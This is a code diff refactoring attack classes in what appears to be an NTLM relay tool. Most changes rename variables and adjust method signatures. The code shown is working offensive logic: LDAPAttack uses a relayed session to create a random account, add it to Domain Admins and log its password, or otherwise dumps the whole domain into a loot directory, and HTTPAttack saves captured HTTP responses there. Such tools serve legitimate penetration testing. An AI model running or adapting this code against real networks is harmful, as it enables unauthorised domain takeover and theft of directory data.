@@ -120,78 +120,87 @@ class SMBAttack(Thread):
                     remoteOps.finish()
 
 #Define global variables to prevent dumping the domain twice
-dumpeddomain = False
-addedda = False
+dumpedDomain = False
+addedDomainAdmin = False
 class LDAPAttack(Thread):
     def __init__(self, config, LDAPClient, username):
         Thread.__init__(self)
         self.daemon = True
+
         #Import it here because non-standard dependency
         self.ldapdomaindump = __import__('ldapdomaindump')
         self.client = LDAPClient
-        self.username = username
+        self.username = username.decode('utf-16le')
+
         #Global config
         self.config = config
 
-    def addDA(self):
-        global addedda
-        if addedda:
+    def addDA(self, domainDumper):
+        global addedDomainAdmin
+        if addedDomainAdmin:
             logging.error('DA already added. Refusing to add another')
             return
+
         #Random password
-        new_password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+
         #Random username
-        new_user = ''.join(random.choice(string.ascii_letters) for _ in range(10))
-        dd = self.dd
+        newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+
         ucd = {
-            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % dd.root,
-            'distinguishedName': 'CN=%s,CN=Users,%s' % (new_user,dd.root),
-            'cn': new_user,
-            'sn': new_user,
-            'givenName': new_user,
-            'displayName': new_user,
-            'name': new_user,
+            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % domainDumper.root,
+            'distinguishedName': 'CN=%s,CN=Users,%s' % (newUser,domainDumper.root),
+            'cn': newUser,
+            'sn': newUser,
+            'givenName': newUser,
+            'displayName': newUser,
+            'name': newUser,
             'userAccountControl': 512,
             'accountExpires': 0,
-            'sAMAccountName': new_user,
-            'unicodePwd': '"{}"'.format(new_password).encode('utf-16-le')
+            'sAMAccountName': newUser,
+            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
         }
-        res = self.client.c.add('CN=%s,CN=Users,%s' % (new_user,dd.root),['top','person','organizationalPerson','user'],ucd)
+
+        res = self.client.connection.add('CN=%s,CN=Users,%s' % (newUser,domainDumper.root),['top','person','organizationalPerson','user'],ucd)
         if not res:
-            logging.error('Failed to add a new user: %s' % str(self.client.c.result))
+            logging.error('Failed to add a new user: %s' % str(self.client.connection.result))
         else:
-            logging.info('Adding new user with username: %s and password: %s result: OK' % (new_user,new_password))
+            logging.info('Adding new user with username: %s and password: %s result: OK' % (newUser,newPassword))
+
         #TODO: Fix this with localized DA group
-        res = self.client.c.modify('CN=Domain Admins,CN=Users,%s' % dd.root,{'member': [(self.client.MODIFY_ADD,['CN=%s,CN=Users,%s' % (new_user,dd.root)])]})
+        res = self.client.connection.modify('CN=Domain Admins,CN=Users,%s' % domainDumper.root, {
+            'member': [(self.client.MODIFY_ADD, ['CN=%s,CN=Users,%s' % (newUser, domainDumper.root)])]})
         if res:
-            logging.info('Adding user: %s to group Domain Admins result: OK' % new_user)
+            logging.info('Adding user: %s to group Domain Admins result: OK' % newUser)
             logging.info('Domain Admin privileges aquired, shutting down...')
-            addedda = True
+            addedDomainAdmin = True
             thread.interrupt_main()
         else:
-            logging.error('Failed to add user to Domain Admins group: %s' % str(self.client.c.result))
+            logging.error('Failed to add user to Domain Admins group: %s' % str(self.client.connection.result))
 
     def run(self):
-        global dumpeddomain
+        global dumpedDomain
         #Set up a default config
-        ddc = self.ldapdomaindump.domainDumpConfig()
+        domainDumpConfig = self.ldapdomaindump.domainDumpConfig()
+
         #Change the output directory to configured rootdir
-        ddc.basepath = self.config.lootdir
+        domainDumpConfig.basepath = self.config.lootdir
+
         #Create new dumper object
-        self.dd = self.ldapdomaindump.domainDumper(self.client.s,self.client.c,ddc)
-        isda = self.dd.isDomainAdmin(self.username)
-        if isda:
+        domainDumper = self.ldapdomaindump.domainDumper(self.client.server, self.client.connection, domainDumpConfig)
+
+        if domainDumper.isDomainAdmin(self.username):
             logging.info('User is a Domain Admin!')
             if 'ldaps' in self.client.target:
-                self.addDA()
+                self.addDA(domainDumper)
             else:
                 logging.error('Connection to LDAP server does not use LDAPS, to enable adding a DA specify the target with ldaps:// instead of ldap://')
         else:
             logging.info('User is not a Domain Admin')
-            if not dumpeddomain:
+            if not dumpedDomain:
                 logging.info('Dumping domain info for first time')
-                self.dd.domainDump()
-                dumpeddomain = True
+                domainDumper.domainDump()
+                dumpedDomain = True
 
 class HTTPAttack(Thread):
     def __init__(self, config, HTTPClient, username):
@@ -211,10 +220,13 @@ class HTTPAttack(Thread):
 
         #Remove protocol from target name
         safeTargetName = self.client.target.replace('http://','').replace('https://','')
+
         #Replace any special chars in the target name
         safeTargetName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', safeTargetName)
+
         #Combine username with filename
         fileName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username.decode('utf-16-le')) + '-' + safeTargetName + '.html'
+
         #Write it to the file
         with open(os.path.join(self.config.lootdir,fileName),'w') as of:
             of.write(self.client.lastresult)
